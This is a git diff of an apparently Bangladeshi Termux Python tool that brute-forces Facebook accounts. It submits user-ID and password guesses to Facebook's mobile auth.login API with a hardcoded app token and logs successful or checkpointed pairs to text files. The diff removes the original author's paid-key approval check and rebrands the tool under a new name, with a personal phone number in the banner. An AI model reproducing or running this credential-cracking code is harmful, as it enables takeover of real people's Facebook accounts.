@@ -81,19 +81,7 @@ cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 def clear():
 	os.system('clear')
 # BACK
-def back():
-	login()
 
-ahsan="MIM"
-imt="-M1MF3RDUS=="
-ak="FM"
-myid=uuid.uuid4().hex[:10].upper()
-try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
-except:
-	kok=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'w')
-	kok.write(myid+imt)
-	kok.close()
 def login():
 	try:
 		token = open('.token.txt','r').read()
@@ -401,12 +389,12 @@ logo = ("""\x1b[1;92m/
 \033[1;92Wellcome [1;90m════════════════════════════════════════════\x1b[1;92mLove you
 \033[1;92m\x1b[1;90m════════════════════════════════════════════\x1b[1;92Virtual Kings
            \x1b[1;92m╔═════════════════════════════╗
-           \x1b[1;92m║ TOOL NAME : { TOOLRKE ZOR XERA TANHA 5$  }      
-           \x1b[1;92m║ AUTHOR    : VIRAT UP                  
-           \x1b[1;92m║ GITHUB     :   NOUN               
-           \x1b[1;92m║ FACEBOOK :  NOUN      
+           \x1b[1;92m║ TOOL NAME : { RJ-JUST NOW LOGIN V-2 }      
+           \x1b[1;92m║ AUTHOR    : Md. Jahidul islam                    
+           \x1b[1;92m║ GITHUB     :  md Jahidul islam               
+           \x1b[1;92m║ FACEBOOK : Md Jahidul Islam ( জাহিদ)         
            \x1b[1;92m║ VERSION    :   7.0.0                   Dont forget Allah😊 
-           \x1b[1;92m║ WHATSAPP : [  ]                 
+           \x1b[1;92m║ WHATSAPP : [ +8801701707661 ]                 
            \x1b[1;92m╚═════════════════════════════╝
 \033[1;92m\x1b[1;90m════════════════════════════════════════════\x1b[1;92m
 \033[1;92\x1b[1;90m════════════════════════════════════════════\x1b[1;92mThanks Mahin""")
@@ -1283,15 +1271,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ ViratUp-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Jahidul-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-VIRATUP-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Jahidul-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ ViratUp-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Jahidul-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-VIRATUP-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Jahidul-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1299,37 +1287,4 @@ class Main:
 		self.loop +=1
 
 
-def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
-	clear()
-	print(logo)
-	r1=requests.get("https://raw.githubusercontent.com/ViratUp/VIRAT/main/README.md").text
-	if key1 in r1:
-		os.system('clear')
-		print(logo)
-		Main()
-	else:
-		os.system("clear")
-		print(logo)
-		print("\t \033[1;32m First Get Approvel\033[1;37m ")
-		time.sleep(1)
-		os.system("clear")
-		print(logo)
-		print ("")
-		print(" \033[1;32m VIRAT UP  Tool Paid You Need Get Approved First\033[1;37m\n")
-		print ("")
-		print(" Your Key is Not Approved ")
-		print("")
-		print(" Copy And Send Key To Admin")
-		print ("")
-		print (" Your Key : "+ak+ahsan+key1)
-		print ("")
-		name = input(" Type Your Name : ")
-		print ("")
-		input(" Press Enter To Send Key Admin telegram")
-		time.sleep(3.5)
-		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
-		os.system('am start https://telegram.com/@virat1209=' + tks)
-		Subscraption()        
-Subscraption()
-
+Main()
